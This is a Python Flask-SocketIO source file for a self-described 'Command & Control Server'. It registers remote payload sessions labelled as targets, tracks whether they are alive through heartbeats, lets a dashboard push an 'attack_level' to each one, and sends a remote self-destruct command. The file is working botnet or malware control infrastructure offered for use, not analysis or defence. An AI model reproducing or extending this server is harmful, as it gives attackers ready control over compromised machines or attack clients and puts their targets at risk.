# UCAR System: Command & Control Server
# Updated for Trash Bin Support

from flask import Flask
from flask_socketio import SocketIO, emit, join_room
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")

# Data Store
# { 'session_id': { 'nametag': '...', 'status': 'online', 'last_seen': 0, 'attack_level': 0, 'deleted': False } }
sessions = {}

def check_offline_sessions():
    """Checks for offline sessions."""
    while True:
        now = time.time()
        changed = False
        for sid, data in sessions.items():
            # Only mark offline if not already in trash
            if not data['deleted'] and data['status'] == 'online' and now - data['last_seen'] > 30:
                sessions[sid]['status'] = 'offline'
                changed = True
        if changed:
            socketio.emit('session_list_update', sessions, namespace='/dashboard')
        socketio.sleep(10)

socketio.start_background_task(check_offline_sessions)

# --- Dashboard Namespace ---

@socketio.on('connect', namespace='/dashboard')
def dashboard_connect():
    emit('session_list_update', sessions)

@socketio.on('update_attack_level', namespace='/dashboard')
def handle_attack(data):
    sid = data.get('session_id')
    level = data.get('level')
    if sid in sessions:
        sessions[sid]['attack_level'] = level
        socketio.emit('command_update_attack', {'level': level}, namespace='/payload', room=sid)
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('move_to_trash', namespace='/dashboard')
def move_to_trash(data):
    """Soft delete: Moves session to trash bin."""
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['deleted'] = True
        # Automatically stop attack when moved to trash
        sessions[sid]['attack_level'] = 0
        socketio.emit('command_update_attack', {'level': 0}, namespace='/payload', room=sid)
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('restore_session', namespace='/dashboard')
def restore_session(data):
    """Restores session from trash bin."""
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['deleted'] = False
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('permanent_delete', namespace='/dashboard')
def permanent_delete(data):
    """Hard delete: Triggers self-destruct and removes from server."""
    sid = data.get('session_id')
    if sid in sessions:
        # Send kill command
        socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
        del sessions[sid]
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('update_nametag', namespace='/dashboard')
def update_nametag(data):
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['nametag'] = data.get('nametag')
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

# --- Payload Namespace ---

@socketio.on('payload_register', namespace='/payload')
def payload_register(data):
    sid = data.get('session_id')
    if not sid: return
    join_room(sid)
    
    if sid not in sessions:
        sessions[sid] = {
            'nametag': f'Target-{sid[:4]}', 
            'status': 'online', 
            'last_seen': time.time(), 
            'attack_level': 0,
            'deleted': False
        }
    else:
        sessions[sid]['status'] = 'online'
        sessions[sid]['last_seen'] = time.time()
        
    socketio.emit('session_list_update', sessions, namespace='/dashboard')
    # Sync state
    emit('command_update_attack', {'level': sessions[sid]['attack_level']}, namespace='/payload', room=sid)
    if sessions[sid]['deleted']:
        # If it reconnects but is supposed to be in trash, ensure it isn't attacking
        emit('command_update_attack', {'level': 0}, namespace='/payload', room=sid)

@socketio.on('payload_heartbeat', namespace='/payload')
def heartbeat(data):
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['last_seen'] = time.time()

if __name__ == '__main__':
    socketio.run(app)
